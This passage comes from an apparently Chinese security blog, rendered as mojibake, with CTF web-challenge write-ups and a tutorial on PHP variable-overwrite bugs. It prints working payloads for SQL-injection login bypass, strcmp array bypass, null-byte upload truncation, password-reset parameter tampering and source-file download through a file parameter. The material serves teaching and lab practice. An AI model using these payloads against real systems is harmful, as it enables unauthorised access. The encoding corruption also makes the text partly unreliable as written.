æœ‰å…³å˜é‡è¦†ç›–çš„æ¼æ´åˆ©ç”¨åœ¨æˆ‘çš„å¦å¤–ä¸€ç¯‡åšæ–‡æœ‰è¯¦ç»†ä»‹ç»ï¼Œå¯ä»¥ç§»æ­¥äºæ­¤ã€‚ ç›´æ¥æŸ¥çœ‹source.phpæ–‡ä»¶çš„å…³é”®ä»£ç æ®µï¼š 12345678910&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] &#x3D;&#x3D; &quot;POST&quot;) &#123; ?&gt; &lt;?php extract($_POST); if ($pass &#x3D;&#x3D; $thepassword_123) &#123; ?&gt; &lt;div class&#x3D;&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;&#x2F;code&gt; &lt;&#x2F;div&gt; &lt;?php &#125; ?&gt;&lt;?php &#125; ?&gt; postæ•°æ®ï¼špass=1&amp;thepassword_123=1 æ³¨æ„ï¼šåœ¨é¡µé¢çš„è¾“å…¥è¡¨å•ä¸­è¾“å…¥payloadæ— æ•ˆ ä¼ªè£…è€… é¢˜å¹² è¿™æ˜¯ä¸€ä¸ªåˆ°å¤„éƒ½æœ‰ç€ä¼ªè£…çš„ä¸–ç•Œ é¢˜è§£ æç¤ºæˆ‘ä»¬è¦æœ¬åœ°ç™»å½•ï¼Œåº”è¯¥å°±æ˜¯è¦æˆ‘ä»¬ç”¨ä¸€ä¸ªä¼ªé€ æœ¬åœ°IPåœ°å€è®¿é—®è¯¥é¡µé¢ã€‚BurpSuiteå¯¼å…¥ç¬¬ä¸‰æ–¹Pythonè„šæœ¬å¯ä»¥ å®ç°ä¼ªé€ IPçš„åŠŸèƒ½ã€‚ é™„ä¸ŠPythonè„šæœ¬åœ°å€ï¼šburpFakeIP ä¸Šä¼ ç»•è¿‡ é¢˜å¹² çŒœçŒœä»£ç æ€ä¹ˆå†™çš„ é¢˜è§£ æ—¢ç„¶è¦çŒœä»£ç é€»è¾‘ï¼Œé‚£å°±å…ˆä¸€æ­¥ä¸€æ­¥çš„å°è¯•å’¯~ å¦‚æœä¸ä¸Šä¼ ä»»ä½•æ–‡ä»¶ï¼Œç›´æ¥submitï¼š å¦‚æœä¸Šä¼ phpæ ¼å¼æ–‡ä»¶ï¼š å¦‚æœä¸Šä¼ jpgæ ¼å¼æ–‡ä»¶ï¼š å†ä½¿ç”¨BurpsuiteæŸ¥çœ‹è¯·æ±‚åŒ…ï¼š å°è¯•åœ¨/uploads/åé¢åŠ ä¸Štest.php+ç©ºæ ¼ ï¼š ç„¶åå°†æ‰“å¼€HEXï¼Œå°†test.phpåé¢ç©ºæ ¼20æ”¹ä¸º00ï¼Œæ„é€ 00æˆªæ–­ï¼š å¾—åˆ°flag:nctf{welcome_to_hacks_world} SQLæ³¨å…¥1 é¢˜å¹² å¬è¯´ä½ ä¹Ÿä¼šæ³¨å…¥ï¼Ÿ é¢˜è§£ å…³é”®ä»£ç ï¼š 12345678910111213141516171819&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&#x27;&quot;.$user.&quot;&#x27;) and (pw=&#x27;&quot;.$pass.&quot;&#x27;)&quot;; echo &#x27;&lt;/br&gt;&#x27;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user];?&gt; å¸¸è§„SQLæ³¨å…¥çš„é¢˜ç›®ï¼Œä½¿ç”¨adminç™»å½•ï¼Œé—­åˆ')ï¼Œæˆªæ–­pwåˆ¤æ–­ï¼š payloadï¼šuser=admin')#&amp;pass=1 **flag:nctf{ni_ye_hui_sql?} ** pass check é¢˜å¹² 1234567891011121314pass=@$_POST[&#x27;pass&#x27;];$pass1=***********;//è¢«éšè—èµ·æ¥çš„å¯†ç if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo &quot;flag:nctf&#123;*&#125;&quot;;&#125;else&#123;echo &quot;the pass is wrong!&quot;;&#125;&#125;else&#123;echo &quot;please input pass!&quot;;&#125;?&gt; é¢˜è§£ï¼š strcmp(array,string)==null==0ï¼Œæ‰€ä»¥POSTä¸€ä¸ªæ•°ç»„å¯¹è±¡å³å¯ã€‚ payload: pass[]=qaz flag:nctf{strcmp_is_n0t_3afe} èµ·åå­—çœŸéš¾ é¢˜å¹² 12345678910111213141516171819202122&lt;?phpfunction noother_says_correct($number)&#123; $one = ord(&#x27;1&#x27;); $nine = ord(&#x27;9&#x27;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &#x27;54975581388&#x27;;&#125;$flag=&#x27;*******&#x27;;if(noother_says_correct($_GET[&#x27;key&#x27;])) echo $flag;else echo &#x27;access denied&#x27;;?&gt; é¢˜è§£ ä¸èƒ½å‡ºç°1-9ä¹‹é—´çš„æ•°å­—ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªèƒ½å°è¯•å°†54975581388è½¬æˆ16è¿›åˆ¶ è½¬æ¢åçš„ç»“æœæ˜¯cccccccccï¼Œå¯ä»¥ä½¿ç”¨ payloadï¼š?key=0xccccccccc å¾—åˆ°The flag is:nctf&#123;follow_your_dream&#125; å¯†ç é‡ç½® é¢˜å¹² é‡ç½®ç®¡ç†å‘˜è´¦å·ï¼šadmin çš„å¯†ç  ä½ åœ¨ç‚¹å‡»å¿˜è®°å¯†ç ä¹‹å ä½ çš„é‚®ç®±æ”¶åˆ°äº†ä¸€å°é‡ç½®å¯†ç çš„é‚®ä»¶ é¢˜è§£ è§‚å¯Ÿé¡µé¢å¯ä»¥å‘ç°åœ°å€æ çš„å‚æ•°ç»è¿‡äº†Base64ç¼–ç å¤„ç†ï¼Œè§£ç å¾—åˆ°ctfuserã€‚å¦‚æœè¦é‡ç½®adminçš„å¯†ç ï¼Œæˆ‘ä»¬æŠ“ä¸ªåŒ…å°†åœ°å€æ å‚æ•°å’ŒPOSTæ•°æ®ä¿®æ”¹ä¸€ä¸‹å³å¯ï¼š ?user1=%59%57%52%74%61%57%34%3d user=admin&amp;newpass=1&amp;vcode=1234 flag is:nctf{reset_password_often_have_vuln} SQL Injection é¢˜å¹² ç»§ç»­æ³¨å…¥å§ï¼ TIP:åæ–œæ å¯ä»¥ç”¨æ¥è½¬ä¹‰ ä»”ç»†æŸ¥çœ‹ç›¸å…³å‡½æ•°çš„ç”¨æ³• é¢˜è§£ ç”¨F12æŸ¥çœ‹æºä»£ç ï¼š 12345678910111213141516171819202122#GOAL: login as admin,then get the flag;error_reporting(0);require &#x27;db.inc.php&#x27;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&#x27;username&#x27;]);$password = @clean((string)$_GET[&#x27;password&#x27;]);$query=&#x27;SELECT * FROM users WHERE name=\\&#x27;&#x27;.$username.&#x27;\\&#x27; AND pass=\\&#x27;&#x27;.$password.&#x27;\\&#x27;;&#x27;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&#x27;Invalid password!&#x27;);&#125;echo $flag; sqlè¯­å¥ï¼šSELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\'; è§‚å¯Ÿcleanå‡½æ•°ä¸­çš„è¿”å›å€¼ç»è¿‡htmlentities()å‡½æ•°è¿‡æ»¤ï¼Œè¿™ä¸ªå­—ç¬¦å°†å­—ç¬¦è½¬æ¢ä¸º HTML è½¬ä¹‰å­—ç¬¦ ï¼Œç¬¬äºŒä¸ªå‚æ•°å¦‚æœæ²¡æœ‰é»˜è®¤åªè½¬æ¢åŒå¼•å·ï¼Œä½†å‚æ•°å€¼ä¸ºENT_QUOTESæ—¶æ—¢è½¬æ¢åŒå¼•å·åˆè½¬æ¢å•å¼•å·ã€‚ æˆ‘ä»¬æœ€ç»ˆç›®æ ‡æ˜¯å¹³è¡¡å•å¼•å·ï¼Œå¯æ˜¯ç»è¿‡è¿™ä¸ªå‡½æ•°è¿‡æ»¤æˆ‘ä»¬æ— æ³•è¾“å…¥å•å¼•å·ï¼Œåªèƒ½æƒ³æ€ä¹ˆæ¶ˆç­åŸæ¥çš„å•å¼•å·ã€‚ æ„é€ payloadï¼š?username=\\&amp;password= or 1=1#ä½¿å¾—æŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š 123456789SELECT * FROM users WHERE name&#x3D;&#39;\\&#39; AND pass&#x3D;&#39; or 1%23&#39;å³SELECT * FROM users WHERE name&#x3D;&#39;\\&#39; AND pass&#x3D;&#39; ã€ [name]çš„å€¼ä¸º [&#39; AND pass&#x3D;]ï¼Œå•å¼•å·è¢«è½¬ä¹‰äº†ï¼Œæ˜¾ç„¶é€»è¾‘å€¼ä¸ºfalse ã€or 1&#x3D;1 ã€ ä½†æ²¡å…³ç³»ï¼Œ[false or 1] çš„é€»è¾‘å€¼ä¸ºçœŸ ã€ %23&#39; ã€ %23æ˜¯#çš„urlç¼–ç ï¼Œæ³¨é‡Šæ‰å¤šä½™çš„å•å¼•å· ã€å³select * from users where false or 1 **flag:nctf{sql_injection_is_interesting} ** ç»¼åˆé¢˜ æ‰“å¼€åå‘ç°æ˜¯ä¸€ä¸²çœ‹ä¸æ‡‚çš„ä»£ç ï¼Œgoogleä¸€ä¸‹æ˜¯jsfuckç¼–ç ï¼Œåœ¨çº¿è§£ç ç½‘ç«™ï¼Œç›´æ¥æ‹–åˆ°æ§åˆ¶å°ç•Œé¢æ‰§è¡Œå¾—åˆ° 1bc29b36f623ba82aaf6724fd3b16718.phpã€‚ æ¥ç€æ‰“å¼€è¿™ä¸ªç½‘ç«™å¾—åˆ°æç¤ºï¼š æ ¹æ®æç¤ºæŸ¥çœ‹httpå¤´ä¿¡æ¯ï¼š history of bashæç¤ºæˆ‘ä»¬åœ¨Linuxç³»ç»Ÿä¸­æœ‰ä¸€ä¸ª.history_bashæ–‡ä»¶æ¥è®°å½•æœ€è¿‘è‹¥å¹²æ¡bashå‘½ä»¤ã€‚ æ‰€ä»¥å°è¯•æ‰“å¼€è¯¥ç›®å½•ä¸‹è¿™ä¸ªæ–‡ä»¶ urlï¼šhttp://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history ï¼Œå¾—åˆ°æ–°çš„æç¤ºï¼š åœ¨å½“å‰ç›®å½•ä¸‹è®¿é—®http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zipå¾—åˆ°**flag: nctf{bash_history_means_what} ** SQLæ³¨å…¥2 é¢˜å¹² æ³¨å…¥ç¬¬äºŒé¢˜~~ä¸»è¦è€ƒå¯ŸunionæŸ¥è¯¢ é¢˜è§£ å…³é”®ä»£ç ï¼š 12345678910111213141516&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#x27;$user&#x27;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt; strcasecmp(str1, str2)ï¼šä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰åˆ™è¿”å›0 è§‚å¯Ÿä¸€ä¸‹æ¡ä»¶è¯­å¥ ($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])) mysql_fetch_array() å‡½æ•°è¿”å›çš„å…³è”æ•°ç»„ä¸­é”®ä¸ºå­—æ®µå æ„é€ payloadï¼špostä¸€ä¸‹æ•°æ® user=â€™ union select md(1)#&amp;pass=1 flag: ntcf{union_select_is_wtf} ç»¼åˆé¢˜2 è¿™é“é¢˜æ¯”è¾ƒæœ‰ç»¼åˆæ€§ï¼Œæˆ‘ä¹Ÿæ˜¯çœ‹äº†è¿™ç¯‡WriteUpçš„æç¤ºï¼Œå°±åšä¸€ä¸ªçŸ¥è¯†ç‚¹çš„æ€»ç»“å§ï¼š ä¸‹è½½æç¤ºæ–‡ä»¶çš„Pythonè„šæœ¬ 1234567891011121314import requestsimport codecsfrom bs4 import BeautifulSoupurl=&quot;http://cms.nuptzj.cn/about.php?file=&quot;file_list = [&quot;index.php&quot;,&quot;passencode.php&quot;,&quot;say.php&quot;,&quot;config.php&quot;,&quot;antixss.php&quot;,&quot;about.php&quot;,&quot;so.php&quot;,&quot;antiinject.php&quot;,&quot;xlcteam.php&quot;]for i in file_list: res = requests.get(url+i) print(&quot;dowload &quot;+i) if res.status_code==200: res.encoding=&quot;utf8&quot; with codecs.open(i,&quot;w+&quot;,&quot;utf8&quot;) as handle: print(&quot;done&quot;) text = BeautifulSoup(res.text,&quot;lxml&quot;).text handle.write(text) SQLæ³¨å…¥æ—¶éœ€è¦æ­£ç¡®åœ°æ‰¾åˆ°æ³¨å…¥ç‚¹ SQLæ³¨å…¥è¿‡æ»¤äº†ç©ºæ ¼å¯ä»¥ä½¿ç”¨/**/ä»£æ›¿ å›è°ƒå‡½æ•°åé—¨ å¯†ç é‡ç½®2 é¢˜å¹² 12345TIPS:1.ç®¡ç†å‘˜é‚®ç®±è§‚å¯Ÿä¸€ä¸‹å°±å¯ä»¥æ‰¾åˆ°2.linuxä¸‹ä¸€èˆ¬ä½¿ç”¨viç¼–è¾‘å™¨ï¼Œå¹¶ä¸”å¼‚å¸¸é€€å‡ºä¼šç•™ä¸‹å¤‡ä»½æ–‡ä»¶3.å¼±ç±»å‹bypass é¢˜è§£ æŸ¥çœ‹æºä»£ç æ–‡ä»¶å¾—åˆ°ç®¡ç†å‘˜é‚®ç®±ï¼šadmin@nuptzj.cn æ ¹æ®æç¤ºï¼Œå­¦åˆ°ä¸€ä¸ªæ–°çŸ¥è¯†æ˜¯éæ­£å¸¸å…³é—­viç¼–è¾‘å™¨æ—¶ä¼šç”Ÿæˆä¸€ä¸ª.swpæ–‡ä»¶ æŸ¥çœ‹.index.php.swpå’Œ.submit.php.swpæ–‡ä»¶ï¼Œèƒ½æ‰“å¼€.submit.php.swpæ–‡ä»¶ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die(&#x27;fail&#x27;); if($token!=&#x27;0&#x27;) die(&#x27;fail&#x27;); $sql = &quot;SELECT count(*) as num from `user` where token=&#x27;$token&#x27; AND email=&#x27;$emailAddress&#x27;&quot;; $r = mysql_query($sql) or die(&#x27;db error&#x27;); $r = mysql_fetch_assoc($r); $r = $r[&#x27;num&#x27;]; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo &quot;å¤±è´¥äº†å‘€&quot;; &#125;&#125; è¦æ±‚tokené•¿åº¦ä¸º10ä¸”token!=0ä¸ºå‡ï¼Œæœ‰ä¸¤ç§ç»•è¿‡æ–¹æ³•ï¼Œç¬¬ä¸€ç§ä¼ å…¥token=0000000000ç»•è¿‡ï¼Œç¬¬äºŒç§åˆ©ç”¨å¼±ç±»å‹ï¼ˆå«æœ‰æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ä¹Ÿä¼šè¢«è½¬æ¢ç±»å‹ï¼‰ä¼ å…¥token=0e12345678ç»•è¿‡ã€‚ flag:nctf{thanks_to_cumt_bxs} file_get_contents é¢˜å¹² 12345&lt;!--$file = $_GET[&#x27;file&#x27;];if(@file_get_contents($file) == &quot;meizijiu&quot;)&#123; echo $nctf;&#125;--&gt; é¢˜è§£ file_get_contents() å‡½æ•°å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸² phpä¼ªåè®®ä¹‹ä¸€ï¼šâ€php://inputâ€å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ,ï¼Œå°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚ å˜é‡è¦†ç›– é¢˜å¹² å˜é‡è¦†ç›–ï¼Œä»£ç å®¡è®¡ç±»é¢˜ç›® 1234567&lt;!--foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125; if($name == &quot;meizijiu233&quot;)&#123; echo $flag;&#125;--&gt; é¢˜è§£ foreach éå†æ•°ç»„æˆ–å¯¹è±¡ï¼Œå®ƒä¼šåœ¨æ¯æ¬¡å¾ªç¯ä¸­æŠŠå½“å‰çš„é”®åèµ‹ç»™å˜é‡ $keyï¼Œå€¼èµ‹ç»™å˜é‡$valueã€‚","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹å˜é‡è¦†ç›–æ¼æ´åˆ©ç”¨","date":"2019-11-18T15:22:16.000Z","path":"Web_security/basic_learning/14.å˜é‡è¦†ç›–æ¼æ´åˆ©ç”¨/","text":"Webå®‰å…¨å­¦ä¹ ä¹‹å˜é‡è¦†ç›–æ¼æ´åˆ©ç”¨ è¿™ä¸€ç¯‡ä¸»è¦é€šè¿‡å‡ é“CTFé¢˜è®²è§£ä¸€ä¸‹PHPå˜é‡è¦†ç›–æ¼æ´åˆ©ç”¨ï¼Œä¸»è¦æ¶‰åŠåˆ°extract()å‡½æ•°ï¼Œparse_str()å‡½æ•°ï¼Œimport_request_variables()å‡½æ•°ï¼Œ$$è¿ç®—ç¬¦ã€‚ å…¨å±€å˜é‡è¦†ç›– PHP 5.3.0è¢«åºŸå¼ƒï¼ŒPHP5.4.0è¢«ç§»é™¤ PHPä¸­ä½¿ç”¨å˜é‡å¹¶ä¸éœ€è¦åˆå§‹åŒ–ï¼Œå› æ­¤register_globals=Onæ—¶ï¼Œå˜é‡æ¥æºå¯èƒ½æ˜¯å„ä¸ªä¸åŒçš„åœ°æ–¹ï¼Œæ¯”å¦‚é¡µé¢çš„è¡¨å•ã€Cookieç­‰ã€‚ä¾‹å¦‚ï¼š 123456&lt;?phpecho &quot;Register_gl`obals: &quot; . (int)ini_get(&quot;register_globals&quot;) . &quot;&lt;br/&gt;&quot;;if ($auth) &#123; echo &quot;private&quot;;&#125;?&gt; å½“register_globals=Offæ—¶ï¼Œè¿™æ®µä»£ç ä¸ä¼šæœ‰é—®é¢˜ï¼š ä½†æ˜¯å½“register_globals=Onæ—¶ï¼Œæäº¤http://localhost/variableCover/index.php/?auth=1ï¼Œå˜é‡$authä¼šè‡ªåŠ¨å¾—åˆ°èµ‹å€¼ï¼š å¦‚æœåœ¨ä»£ç ä¸­å·²ç»åˆå§‹åŒ–äº†$authå˜é‡ï¼Œä¹Ÿä¸ä¼šæœ‰å˜é‡è¦†ç›–æ¼æ´ã€‚ å¦å¤–é€šè¿‡$GLOBALSè·å–çš„å˜é‡ï¼Œä¹Ÿå¯èƒ½å¯¼è‡´å˜é‡è¦†ç›–ã€‚ extract()å˜é‡è¦†ç›– extract()å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰ç¬¦å·è¡¨ã€‚è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œæ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­æ¯ä¸€ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚ å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š 1int extract ( array $var_array [, int $extract_type [, string $prefix ]] ) å…¶ä¸­ï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šå‡½æ•°å°†å˜é‡å¯¼å…¥ç¬¦å·è¡¨æ—¶çš„è¡Œä¸ºï¼Œæœ€å¸¸è§çš„ä¸¤ä¸ªå€¼æ˜¯EXTR_OVERWRITEå’ŒEXTR_SKIPã€‚ å½“å€¼ä¸ºEXTR_OVERWRITEæ—¶ï¼Œåœ¨å°†å˜é‡å¯¼å…¥ç¬¦å·è¡¨çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå˜é‡åå‘ç”Ÿå†²çªï¼Œåˆ™è¦†ç›–æ‰€æœ‰å˜é‡ï¼›å€¼ä¸ºEXTR_SKIPåˆ™è¡¨ç¤ºè·³è¿‡ä¸è¦†ç›–ã€‚è‹¥ç¬¬äºŒä¸ªå‚æ•°æœªæŒ‡å®šï¼Œåˆ™åœ¨é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨EXTR_OVERWRITEã€‚ å½“extract()å‡½æ•°ä»ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„æ•°ç»„ä¸­å¯¼å‡ºå˜é‡ä¸”ç¬¬äºŒä¸ªå‚æ•°æœªè®¾ç½®æˆ–è®¾ç½®ä¸ºEXTR_OVERWRITEæ—¶ï¼Œå°±å­˜åœ¨å˜é‡è¦†ç›–æ¼æ´ï¼Œä¾‹å¦‚ï¼š 12345678910&lt;?php$auth = 1;extract($_GET);if($auth == 1)&#123; echo &quot;private&quot;;&#125;else&#123; echo &quot;public&quot;;&#125;?&gt; åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œextract()ä»$_GETä¸­å¯¼å‡ºå˜é‡ï¼Œä»è€Œå¯ä»¥å¯¼è‡´ä»»æ„å˜é‡è¢«è¦†ç›–ï¼Œå³ï¼š parse_str()å˜é‡è¦†ç›– å‡½æ•°å®šä¹‰ï¼š 1void parse_str (string $str [, array $arr]) å½“parse_str()å‡½æ•°çš„å‚æ•°å€¼å¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶æ—¶ï¼Œåˆ™å­˜åœ¨å˜é‡è¦†ç›–æ¼æ´ï¼š 12345&lt;?php $a = &#x27;init&#x27;;parse_str($SERVER[&#x27;QUERY_STRING&#x27;]);print $a;?&gt; å†æ¥çœ‹ä¸€é“CTFçš„é¢˜ç›®ï¼š 1234567891011121314151617&lt;?phperror_reporting(0);if(empty($_GET[&#x27;id&#x27;])) &#123; show_source(__FILE__); die();&#125; else &#123; include (&#x27;flag.php&#x27;); $a = &quot;www.ca0y1h.top&quot;; $id = $_GET[&#x27;id&#x27;]; @parse_str($id); if ($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;)) &#123; echo $flag; &#125; else &#123; exit(&#x27;so easy!&#x27;); &#125;&#125;?&gt; ä¹Ÿå°±æ˜¯PHPå¼±ç±»å‹å’Œå˜é‡è¦†ç›–ç»“åˆçš„é¢˜ç›®ï¼š mb_parse_str()å˜é‡è¦†ç›– mb_parse_str()å‡½æ•°ç”¨äºè§£æGET/POST/COOKIEæ•°æ®å¹¶è®¾ç½®å…¨å±€å˜é‡ï¼Œå’Œparse_str()ç±»ä¼¼ã€‚ import_request_variables()å˜é‡è¦†ç›– æ”¯æŒç‰ˆæœ¬ï¼šPHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0 import_request_variables()å‡½æ•°å°†GETã€POSTã€Cookiesä¸­çš„å˜é‡å¯¼å…¥åˆ°å…¨å±€ã€‚ å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š 1bool import_request_variables (string $types [, string $prefix]) $typeä»£è¡¨è¦æ³¨å†Œçš„å˜é‡ï¼ŒGä»£è¡¨GETï¼ŒPä»£è¡¨POSTï¼ŒCä»£è¡¨COOKIEï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¦æ³¨å†Œå˜é‡çš„å‰ç¼€ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™å°†è¦†ç›–å…¨å±€å˜é‡ã€‚ä¾‹å¦‚ï¼š 12345678910&lt;?php$auth = &#x27;0&#x27;;import_request_variables(&#x27;P&#x27;);if ($auth === &#x27;0&#x27;) &#123; echo &quot;private&quot;;&#125;else&#123; echo &quot;public&quot;;&#125;?&gt; $$å¯¼è‡´çš„å˜é‡è¦†ç›– $$å³å¯å˜å˜é‡ï¼Œä¸€ä¸ªå¯å˜å˜é‡è·å–äº†ä¸€ä¸ªæ™®é€šå˜é‡çš„å€¼ä½œä¸ºè¿™ä¸ªå¯å˜å˜é‡çš„å˜é‡åã€‚ä¾‹å¦‚ï¼š 1234567&lt;?php $x = &quot;ca01h&quot;; $$x = 666; echo $x.&quot;&lt;br/&gt;&quot;; echo $$x.&quot;&lt;br/&gt;&quot;; echo $ca01h;?&gt; å…¶å®ä¹Ÿå°±ç­‰ä»·äº$($x)ï¼Œè¾“å‡ºä¸ºï¼š 123ca01h666666 $$å¯¼è‡´çš„å˜é‡è¦†ç›–é—®é¢˜åœ¨CTFä»£ç å®¡è®¡é¢˜ç›®ä¸­ç»å¸¸åœ¨foreachä¸­å‡ºç°ï¼Œå¦‚ä»¥ä¸‹çš„ç¤ºä¾‹ä»£ç ï¼Œä½¿ç”¨foreachæ¥éå†æ•°ç»„ä¸­çš„å€¼ï¼Œç„¶åå†å°†è·å–åˆ°çš„æ•°ç»„é”®åä½œä¸ºå˜é‡ï¼Œæ•°ç»„ä¸­çš„é”®å€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚å› æ­¤å°±äº§ç”Ÿäº†å˜é‡è¦†ç›–æ¼æ´ã€‚ 123456789101112131415&lt;?phpforeach (array(&#x27;_COOKIE&#x27;,&#x27;_POST&#x27;,&#x27;_GET&#x27;) as $_request) &#123; foreach ($$_request as $_key=&gt;$_value) &#123; $$_key= $_value; &#125;&#125;$id = isset($id) ? $id : &quot;test&quot;;if($id === &quot;ca01h&quot;) &#123; echo &quot;flag&#123;xxxxxxxxxx&#125;&quot;;&#125; else &#123; echo &quot;Nothing...&quot;;&#125;?&gt; è¿™é‡Œä»¥GETã€POSTæˆ–COOKIEéƒ½èƒ½è§¦å‘å˜é‡è¦†ç›–æ¼æ´ï¼Œä¼ å…¥id=ca01håï¼Œåœ¨foreachè¯­å¥ä¸­ï¼Œ$_keyä¸ºidï¼Œ$_valueä¸ºca01hï¼Œè¿›è€Œ$$_keyä¸º$idï¼Œä»è€Œå®ç°äº†å˜é‡è¦†ç›–ã€‚ æœ€åä»¥ä¸€é“CTFé¢˜ä¸ºæ­¤æ–‡ç« ç»“å°¾ï¼š 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;$_403 = &quot;Access Denied&quot;;$_200 = &quot;Welcome Admin&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)&#123; die(&quot;BugsBunnyCTF is here :pâ€¦&quot;);&#125;if ( !isset($_POST[&quot;flag&quot;]) )&#123; die($_403);&#125;foreach ($_GET as $key =&gt; $value)&#123; $$key = $$value;&#125;foreach ($_POST as $key =&gt; $value)&#123; $$key = $value;&#125;if ( $_POST[&quot;flag&quot;] !== $flag ) &#123; die($_403);&#125; else &#123; echo &quot;This is your flag : &quot;. $flag . &quot;\\n&quot;; die($_200);&#125;?&gt; å¯ä»¥çœ‹åˆ°ï¼Œæœ‰3ä¸ªifè¯­å¥å’Œ2ä¸ªforeachè¯­å¥ã€‚ åœ¨ifè¯­å¥ä¸­ï¼Œç¬¬ä¸€ä¸ªéœ€è¦ä½ æ˜¯é€šè¿‡POSTæ–¹å¼è¿›è¡Œè¯·æ±‚ï¼Œç¬¬äºŒä¸ªæ˜¯éœ€è¦POSTä¸€ä¸ªflagå‚æ•°è¿‡å»ï¼Œç¬¬ä¸‰ä¸ªæ˜¯æ¯”è¾ƒflagå‚æ•°å’ŒåŒ…å«è¿›æ¥çš„çœŸæ­£çš„flagæ˜¯å¦ç›¸ç­‰ã€‚ åœ¨foreachè¯­å¥ä¸­ï¼Œç¬¬ä¸€ä¸ªæ˜¯å¯ä»¥å°†GETçš„å‚æ•°è¿›è¡Œå˜é‡è¦†ç›–ï¼Œç¬¬äºŒä¸ªæ˜¯å°†POSTçš„å‚æ•°è¿›è¡Œå˜é‡è¦†ç›–ï¼Œä½†ä¸¤ä¸ªè¯­å¥çš„å¤„ç†æ˜¯æœ‰ç‚¹åŒºåˆ«çš„å³ä¸€ä¸ªé”®å€¼ä¸º$$valueå¦ä¸€ä¸ªä¸º$valueã€‚ è¿™é‡Œæ•´ç†ä¸€ä¸‹æ€è·¯ï¼š å› ä¸ºPOSTçš„å‚æ•°å¿…é¡»ä¸ºflagï¼Œåˆ™ç¬¬äºŒä¸ªforeachè¯­å¥çš„$keyä¸ºflagï¼Œè¿›è€Œ$$keyä¸º$flagï¼Œä»è€Œå¾—åˆ°$flagçš„å€¼ä¸ºPOSTä¼ é€’çš„flagå‚æ•°çš„å€¼ã€‚ åˆå› 